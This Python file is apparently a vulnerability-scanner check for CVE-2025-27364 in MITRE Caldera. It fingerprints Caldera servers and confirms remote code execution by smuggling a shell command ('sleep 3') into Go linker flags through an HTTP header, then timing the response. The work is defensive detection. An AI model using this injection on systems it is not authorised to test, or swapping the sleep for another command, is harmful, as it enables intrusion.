"""Agent implementation for CVE-2025-27364"""

import datetime
import logging
import re
import time

from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

VULNERABILITY_TITLE = "MITRE Caldera Agent Dynamic Compilation RCE"
VULNERABILITY_REFERENCE = "CVE-2025-27364"
VULNERABILITY_DESCRIPTION = """
All versions of MITRE Caldera (before commit 35bc06e) are vulnerable to remote code 
execution (RCE) through the dynamic compilation functionality of Sandcat and Manx agents.
The vulnerability can be triggered in default configurations as long as the server has
Go, Python, and GCC installed, which are standard requirements for Caldera operation.
"""
RISK_RATING = "CRITICAL"
DEFAULT_TIMEOUT = datetime.timedelta(seconds=10)

CALDERA_PATTERN = r"\s*\|\s*CALDERA"
FILE_DOWNLOAD_PATH = "/file/download"
# Time in seconds to wait during the sleep test
# Not too long to avoid lengthy tests, but long enough to be measurable
SLEEP_DURATION = datetime.timedelta(seconds=3)
# Threshold to determine if a command was executed (in seconds)
# We allow for some processing overhead by using 80% of the expected sleep time
TIME_THRESHOLD = SLEEP_DURATION * 0.8


@exploits_registry.register
class CalderaAgentCompilationRCEExploit(webexploit.WebExploit):
    """
    CVE-2025-27364: MITRE Caldera Agent Dynamic Compilation RCE

    This exploit targets the dynamic compilation functionality in Caldera
    to achieve remote code execution by manipulating Go linker flags.
    """

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
    )

    def accept(self, target: definitions.Target) -> bool:
        """
        Check if the target appears to be a Caldera server.
        """
        try:
            response = self.session.get(
                f"{target.origin}",
                verify=False,
                timeout=DEFAULT_TIMEOUT.seconds,
            )

            # Look for indicators of Caldera in response
            return re.search(CALDERA_PATTERN, response.text, re.IGNORECASE) is not None
        except requests_exceptions.RequestException:
            return False

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """
        Test for the vulnerability using a timing-based approach.

        We send a sleep command and measure the response time. If it takes
        approximately the expected sleep duration, the command was likely executed.
        """
        vulnerabilities: list[definitions.Vulnerability] = []

        try:
            # First, make a request without a sleep command to measure baseline response time
            start_time = time.time()
            self.session.post(
                f"{target.origin}{FILE_DOWNLOAD_PATH}",
                headers={
                    "file": "sandcat.go",
                    "platform": "linux",
                    # Standard HTTP header without sleep command
                    "http": "localhost",
                },
                verify=False,
                timeout=DEFAULT_TIMEOUT.seconds,
            )
            baseline_duration = time.time() - start_time

            logging.info("Baseline request duration: %.2f seconds", baseline_duration)

            # Now, make a request with a sleep command
            sleep_command = f"sleep {SLEEP_DURATION.seconds}"

            start_time = time.time()
            self.session.post(
                f"{target.origin}{FILE_DOWNLOAD_PATH}",
                headers={
                    "file": "sandcat.go",
                    "platform": "linux",
                    # The injection happens here - we leverage the fact that HTTP headers
                    # are processed and added to ldflags which are passed to compile_go
                    "http": f"-extld=gcc -buildmode=c-archive -extldflags=-wrapper=sh,-c,'{sleep_command}'",
                },
                verify=False,
                # Increase timeout to account for sleep duration
                timeout=DEFAULT_TIMEOUT.seconds + SLEEP_DURATION.seconds,
            )
            sleep_duration = time.time() - start_time

            logging.info("Sleep command request duration: %.2f seconds", sleep_duration)

            # If the sleep request took significantly longer than the baseline request
            # and is at least as long as our threshold, the command was executed
            if (sleep_duration - baseline_duration) >= TIME_THRESHOLD.seconds:
                logging.info("Target appears to be vulnerable to CVE-2025-27364")
                vuln = self.create_vulnerability(target)
                vulnerabilities.append(vuln)

        except requests_exceptions.RequestException as e:
            logging.error("Error during vulnerability check: %s", e)

        return vulnerabilities
